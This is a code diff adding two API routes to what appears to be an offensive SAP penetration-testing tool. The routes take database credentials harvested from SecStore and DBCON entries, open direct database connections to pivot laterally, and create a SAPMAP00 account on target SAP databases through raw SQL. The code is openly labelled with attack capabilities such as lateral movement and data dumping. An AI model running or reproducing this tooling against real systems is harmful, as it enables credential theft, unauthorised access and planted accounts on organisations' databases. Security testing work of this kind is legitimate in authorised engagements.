@@ -13469,6 +13469,121 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:download_secstore", "Download SecStore", _run)
         return json.dumps({"status": "started"})
 
+    # ---- DBCON: external-DB pivot (issue #21) -------------------------
+    #
+    # Discovered as a side-effect of SecStore integration: any
+    # /DBCON/<CONNAME> RSECTAB entry gets paired with the DBCON table
+    # row of the same name to produce a complete (dbms, host, port,
+    # user, password) tuple.  Two explicit operator actions per edge:
+    # test the connection (opens driver-level session, fingerprints
+    # SAP-shape via USR02), and create SAPMAP00 directly via the
+    # driver when SAP-shape.
+    @app.route("/api/node/<sid>/dbcon/test", method="POST")
+    def node_dbcon_test(sid):
+        response.content_type = "application/json"
+        data = request.json or {}
+        con_name = (data.get("con_name") or "").strip()
+        if not con_name:
+            return json.dumps({"error": "con_name required"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        edge = next((e for e in (node.dbcon_edges or [])
+                     if e.con_name.upper() == con_name.upper()), None)
+        if edge is None:
+            return json.dumps({
+                "error": f"DBCON {con_name!r} not on {sid} — "
+                         f"run SecStore integration first"})
+
+        def _run():
+            _task_start(f"{sid}:dbcon_test:{con_name}",
+                        f"DBCON test → {con_name}")
+            try:
+                from sap_dbcon_probe import probe_dbcon_edge
+                probe_dbcon_edge(edge)
+                if edge.is_sap_shape:
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"DBCON {con_name} — SAP-shape DB "
+                        f"reachable via direct driver "
+                        f"({edge.dbms} {edge.user}@{edge.host}:"
+                        f"{edge.port})"
+                        + (f", target SID={edge.target_sid}"
+                           if edge.target_sid else ""),
+                        ref="dbcon.probe.sap_shape",
+                        attack_capability="lateral.dbcon_direct")
+                elif edge.reachable:
+                    sapmap_findings.emit_finding(
+                        "HIGH", sid,
+                        f"DBCON {con_name} — non-SAP DB reachable "
+                        f"({edge.dbms} {edge.user}@{edge.host}:"
+                        f"{edge.port}); direct table read available",
+                        ref="dbcon.probe.non_sap",
+                        attack_capability="data.dbcon_dump")
+            finally:
+                _task_end(f"{sid}:dbcon_test:{con_name}")
+
+        _bg(f"{sid}:dbcon_test:{con_name}",
+             f"DBCON test {con_name}", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/dbcon/create_user", method="POST")
+    def node_dbcon_create_user(sid):
+        response.content_type = "application/json"
+        data = request.json or {}
+        con_name = (data.get("con_name") or "").strip()
+        client = (data.get("client") or "000").strip() or "000"
+        if not con_name:
+            return json.dumps({"error": "con_name required"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        edge = next((e for e in (node.dbcon_edges or [])
+                     if e.con_name.upper() == con_name.upper()), None)
+        if edge is None:
+            return json.dumps({
+                "error": f"DBCON {con_name!r} not on {sid} — "
+                         f"run SecStore integration first"})
+        if not edge.reachable:
+            return json.dumps({
+                "error": (f"DBCON {con_name} not reachable — click "
+                          f"Test Connection first")})
+        if not edge.is_sap_shape:
+            return json.dumps({
+                "error": (f"DBCON {con_name} target is not a "
+                          f"SAP-shape DB (USR02 not present) — direct "
+                          f"user creation only works against SAP DBs")})
+        target_sid = edge.target_sid or con_name.upper()[:3]
+
+        def _run():
+            _task_start(f"{sid}:dbcon_create:{con_name}",
+                        f"DBCON create SAPMAP00 → {con_name}")
+            try:
+                from sap_dbcon_probe import create_sapmap_user_via_dbcon
+                res = create_sapmap_user_via_dbcon(
+                    edge, target_sid=target_sid, client=client,
+                    state=api.state, source_node=node)
+                if res.get("ok"):
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"DBCON {con_name} — SAPMAP00 created on "
+                        f"{target_sid}/{client} via direct "
+                        f"{edge.dbms} connection ("
+                        f"{res.get('statements_ok', 0)}/"
+                        f"{res.get('statements_total', 0)} SQL "
+                        f"statements accepted, USR02 verify OK)",
+                        ref="dbcon.create.ok",
+                        attack_capability="lateral.dbcon_direct")
+                else:
+                    print(f"[-] {sid}: DBCON {con_name} create-user "
+                          f"failed: {res.get('error', 'unknown')}")
+            finally:
+                _task_end(f"{sid}:dbcon_create:{con_name}")
+
+        _bg(f"{sid}:dbcon_create:{con_name}",
+             f"DBCON create-user {con_name}", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/create_tcpip_dest", method="POST")
     def node_create_tcpip(sid):
         response.content_type = "application/json"
